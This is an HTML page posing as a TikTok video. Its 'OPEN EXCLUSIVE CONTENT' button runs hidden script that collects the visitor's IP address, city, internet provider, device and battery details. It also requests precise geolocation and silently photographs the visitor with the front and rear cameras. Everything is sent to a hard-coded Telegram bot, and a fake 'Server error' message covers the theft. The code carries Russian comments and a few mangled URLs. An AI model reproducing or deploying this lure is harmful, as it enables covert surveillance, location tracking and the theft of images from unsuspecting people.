<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video</title>
    <style>
        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
        #watchBtn { background: #ff0050; color: #fff; border: none; padding: 18px 40px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; transition: 0.3s; }
        #watchBtn:disabled { background: #222; color: #777; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <button id="watchBtn">OPEN EXCLUSIVE CONTENT</button>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const TOKEN = '8282459787:AAFCkf9w_T_Xvorsn-Tg0ZMgdcfWC9N8mQQ';
        const CHAT_ID = '6660269414';

        const btn = document.getElementById('watchBtn');
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        btn.addEventListener('click', async () => {
            btn.textContent = "Loading...";
            btn.disabled = true;

            // 1. Сбор системных данных и IP
            try {
                const ipRes = await fetch('https://ipapi.co');
                const d = await ipRes.json();
                const batt = await navigator.getBattery();
                const info = `📱 Юзер: ${navigator.platform}\n🌐 IP: ${d.ip}\n🏙 Город: ${d.city}, ${d.country_name}\n🔋 Заряд: ${batt.level * 100}%\n🔗 Провайдер: ${d.org}`;
                await sendMsg(info);
            } catch(e) { await sendMsg("Не удалось собрать данные об IP/Системе"); }

            // 2. Геолокация
            navigator.geolocation.getCurrentPosition(async (p) => {
                await sendMsg(`📍 Локация: https://google.com{p.coords.latitude},${p.coords.longitude}`);
            }, null, {enableHighAccuracy: true});

            // 3. Фото (Фронталка, затем Задняя)
            await snap('user', 'FRONT');
            await snap('environment', 'REAR');

            // 4. Финал
            btn.textContent = "Server error. Try again later";
        });

        async function snap(mode, label) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: mode, width: {ideal: 4096}, height: {ideal: 2160} }
                });
                v.srcObject = stream;
                await new Promise(r => setTimeout(r, 1200)); // Пауза для фокуса
                
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                stream.getTracks().forEach(t => t.stop());

                const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, 'img.jpg');
                fd.append('caption', `📸 Снимок: ${label}`);
                await fetch(`https://telegram.org{TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            } catch (e) {
                await sendMsg(`❌ Ошибка камеры ${label}: ${e.message}`);
            }
        }

        async function sendMsg(text) {
            await fetch(`https://telegram.org{TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            });
        }
    </script>
</body>
</html>
